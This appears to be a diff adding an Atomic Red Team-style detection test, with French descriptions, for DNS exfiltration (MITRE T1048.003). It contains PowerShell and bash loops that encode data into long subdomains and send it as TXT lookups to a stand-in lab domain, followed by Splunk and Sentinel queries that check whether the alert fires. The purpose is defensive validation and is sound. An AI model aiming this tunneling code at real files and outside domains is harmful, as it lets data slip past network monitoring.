@@ -1,0 +1,67 @@
+attack_technique: T1048.003
+display_name: DNS Exfiltration
+related_sigma_rule: ../dns_exfiltration.yml
+expected_alert_within_seconds: 120
+prerequisites:
+  - Sysmon avec EID 22 (DnsQuery) activé OU logs résolveur DNS interne
+  - Domaine de lab contrôlé (NS interne ou OOB) pour réceptionner les requêtes
+  - Connectivité DNS sortante depuis le poste de test
+atomic_tests:
+  - name: Simulation tunneling DNS (PowerShell base64 → sous-domaine)
+    description: |
+      Encode en base64 un fichier de test puis émet 50 requêtes DNS
+      avec sous-domaines longs (50+ chars) vers un domaine de lab contrôlé.
+      Reproduit le pattern d'exfiltration via dnscat2 / DNSExfiltrator.
+    supported_platforms: [windows]
+    input_arguments:
+      lab_domain:
+        description: Domaine de lab contrôlé (NE PAS utiliser un domaine prod)
+        type: string
+        default: "lab.internal.test"
+      payload_size:
+        description: Taille du payload simulé (octets)
+        type: integer
+        default: 2000
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $payload = -join ((65..90) + (97..122) | Get-Random -Count #{payload_size} | ForEach-Object {[char]$_})
+        $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))
+        $b64 = $b64 -replace '[/+=]', 'a'
+        for ($i=0; $i -lt $b64.Length; $i+=50) {
+          $chunk = $b64.Substring($i, [Math]::Min(50, $b64.Length - $i))
+          try { Resolve-DnsName -Type TXT "$chunk.#{lab_domain}" -ErrorAction SilentlyContinue } catch {}
+        }
+
+  - name: Simulation requêtes TXT à haute fréquence
+    description: |
+      Émet 200 requêtes DNS de type TXT en moins d'une minute pour
+      déclencher la combinaison entropie élevée + QType TXT.
+    supported_platforms: [linux, macos, windows]
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        for i in $(seq 1 200); do
+          payload=$(head -c 30 /dev/urandom | base64 | tr -d '/+=' | head -c 30)
+          dig TXT "$payload.lab.internal.test" +short > /dev/null 2>&1
+        done
+validation_queries:
+  splunk: |
+    index=sysmon EventCode=22 earliest=-15m
+    | eval qlen=len(QueryName)
+    | stats count avg(qlen) as avg_len max(qlen) as max_len
+            values(Image) as proc by host
+    | where avg_len > 50 OR count > 100
+  sentinel: |
+    DeviceNetworkEvents
+    | where Timestamp > ago(15m) and ActionType == "DnsQueryResponse"
+    | extend qlen = strlen(RemoteUrl)
+    | summarize Total=count(), AvgLen=avg(qlen), MaxLen=max(qlen)
+                by DeviceName, InitiatingProcessFileName
+    | where AvgLen > 50 or Total > 100
+references:
+  - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1048.003
+  - https://github.com/iagox86/dnscat2
+  - https://github.com/Arno0x/DNSExfiltrator
